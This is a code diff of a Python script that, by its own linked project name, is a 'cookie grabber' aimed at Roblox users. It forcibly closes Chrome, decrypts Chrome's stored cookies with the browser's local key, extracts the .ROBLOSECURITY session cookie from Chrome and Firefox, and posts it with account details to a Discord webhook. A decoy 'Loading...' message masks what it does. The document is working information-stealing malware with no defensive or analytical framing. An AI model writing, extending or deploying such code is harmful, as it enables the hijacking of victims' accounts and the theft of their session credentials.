@@ -5,29 +5,30 @@ import browser_cookie3
 import sqlite3
 import subprocess
 import shutil
+import win32crypt
 from Crypto.Cipher import AES
 from discordwebhook import Discord
 import httpx
 import re
 import requests
 import robloxpy
-import platform
 
-# Check if the current system is Windows, because win32crypt is Windows-specific
-is_windows = platform.system() == "Windows"
+# Check if the current system is Windows
+is_windows = os.name == 'nt'
 
-# Avoid using win32crypt if the system is not Windows
-if is_windows:
-    import win32crypt
+try:
+    subprocess.call("TASKKILL /f /IM CHROME.EXE")
+except FileNotFoundError:
+    print("")
 
-webhook_url = 'your_webhook_url_here'
+webhook_url = 'heh'
 
 dummy_message = "Loading..."
 print(dummy_message)
 
 def get_encryption_key():
     if not is_windows:
-        return None  # Return None if not on Windows
+        return None
 
     local_state_path = os.path.join(os.environ["USERPROFILE"],
                                     "AppData", "Local", "Google", "Chrome",
@@ -54,6 +55,10 @@ def decrypt_data(data, key):
 
 
 def CookieLog():
+    if not is_windows:
+        print("Skipping cookie extraction: Not on Windows")
+        return None
+
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
     filename = "Cookies.db"
@@ -75,7 +80,7 @@ def CookieLog():
     db.close()
 
 def PlanB():
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+    data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
 
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
@@ -203,10 +208,10 @@ if __name__ == "__main__":
     discord = Discord(url=webhook_url)
     discord.post(
         username="BOT - Pirate",
-        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754",
+        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
         embeds=[
             {
-                "title": "Account Details",
+                "title": "Results - Account",
                 "thumbnail": {"url": headshot},
                 "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                 "fields": [
@@ -224,8 +229,8 @@ if __name__ == "__main__":
     )
 
     discord.post(
-        username="BOT - Ovion",
-        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754",
+        username="BOT - Cookie",
+        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
         embeds=[
             {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
         ],
